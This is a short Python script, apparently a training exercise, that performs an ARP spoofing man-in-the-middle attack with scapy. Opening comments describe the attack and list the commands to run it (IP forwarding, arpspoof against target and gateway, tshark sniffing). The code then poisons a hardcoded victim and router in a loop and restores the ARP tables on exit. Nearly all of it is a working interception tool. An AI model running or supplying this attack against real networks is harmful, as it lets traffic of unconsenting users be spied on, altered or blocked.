# ARP spoofing is an attack where an attacker sends false ARP messages over
# a local network. The router thinks the attacker machine is the victim,
# and the victim machine thinks the attacker machine is the router.

# Once linked, all network traffic meant for the target is silently routed
# through the attacker's machine first,
# enabling Man-in-the-Middle (MitM) attacks to spy on, alter, or block traffic.

#Step 1 - enable IP Forwarding
#You must tell the operating system to act as a router so the target do not
#lose connection completely
#echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

#Step 2: Intercept Traffic from the Victim
#You must convince the victim's machine that you are the router.
#sudo arpspoof -i {interface} -t {target's ip} {gateway/router ip}

#Step 3: Intercept Traffic from the Router (Dual-Spoofing)
#open a second terminal window
#sudo arpspoof -i {interface} -t {gateway/router ip} {target's ip}

#monitor the network with
#tshark -i eth0

import scapy.all as scapy
import time
import sys

def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac_address(target_ip)

    #create packet
    packet = scapy.ARP(
        op=2, #ARP response is set to 2, request to 1.
        pdst=target_ip, #victim IP address/ destination ip address
        hwdst=target_mac, #victim MAC Address / hardware destination
        psrc=spoof_ip #Router/gateway IP address
    )
    #send packet
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac_address(destination_ip)
    source_mac = get_mac_address(source_ip)

    packet = scapy.ARP(
        op=2, #ARP response is set to 2, request to 1.
        pdst=destination_ip, #victim IP address/ destination ip address
        hwdst=destination_mac,#victim MAC Address / hardware destination
        psrc=source_ip, #Router/gateway IP address,
        hwsrc=source_mac
    )
    scapy.send(packet, count=4, verbose=False)

target_ip = "192.168.124.138"
gateway_ip = "192.168.124.2"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent:" + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(1) #put a delay of 1 seconds so we don't send too many packets
except KeyboardInterrupt:
    print("\n[+] Ctrl+C received... Resetting ARP table..... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


#print(f"\r[+] Packets sent: {sent_packets_count}", end="", flush=True) - python3
